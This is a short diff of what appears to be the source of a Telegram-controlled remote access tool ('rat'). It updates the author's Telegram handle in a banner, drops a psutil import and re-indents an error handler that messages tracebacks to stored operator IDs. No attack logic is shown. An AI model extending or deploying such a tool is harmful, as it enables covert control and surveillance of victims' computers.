@@ -7,7 +7,7 @@
 ░░░╚═╝░░░░╚═════╝░  ╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░
 =============================================
             ｂｙ ｂ１ｔ０ｎｅ
-        tg: https://t.me/u53rnm3
+        tg: https://t.me/w0rld_adm1n
     github: https://github.com/ArtemChikc
 '''
 import telebot
@@ -21,7 +21,6 @@ import random
 import cv2
 import threading
 import traceback
-import psutil
 
 import config
 import functions
@@ -340,7 +339,7 @@ def main():
         rat.bot.polling(interval=1, skip_pending=True)
     except Exception as e:
         for id in rat.users_ids.decrypt_all_ids():
-                rat.bot.send_message(id, f"КРИТИЧЕСКАЯ ОШИБКА: {traceback.format_exc()}")
+            rat.bot.send_message(id, f"КРИТИЧЕСКАЯ ОШИБКА: {traceback.format_exc()}")
 
 
 
